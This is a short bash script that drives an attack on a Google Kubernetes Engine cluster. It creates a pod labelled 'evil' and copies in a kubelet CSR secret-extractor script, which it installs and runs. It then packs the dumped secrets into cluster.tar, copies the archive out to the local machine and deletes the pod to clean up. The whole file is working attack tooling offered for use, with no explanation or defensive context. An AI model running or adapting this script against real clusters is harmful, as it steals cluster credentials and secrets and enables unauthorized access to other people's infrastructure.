#!/bin/bash

kubectl create -f evil-pod.yaml
PODNAME=$(kubectl get pods -l run=evil -o=jsonpath='{.items[*].metadata.name}')
kubectl wait deployment --timeout=60s --for condition=available -l run=evil
kubectl cp gke-kubelet-csr-secret-extractor.sh $PODNAME:/root
kubectl exec -it $PODNAME -- chmod +x /root/gke-kubelet-csr-secret-extractor.sh
kubectl exec -it $PODNAME -- apt-get update
kubectl exec -it $PODNAME -- apt-get install curl -y
kubectl exec -it $PODNAME -- /bin/bash -c "cd /root; ./gke-kubelet-csr-secret-extractor.sh"
kubectl exec -it $PODNAME -- /bin/bash -c "cd /root; tar -cf cluster.tar dumps secrets"
if [[ ! -f cluster.tar ]]; then
  kubectl cp $PODNAME:/root/cluster.tar cluster.tar
  tar -tvf cluster.tar
else
  echo "Local cluster.tar exists. Showing existing file"
  tar -tvf cluster.tar
fi
kubectl delete -f evil-pod.yaml
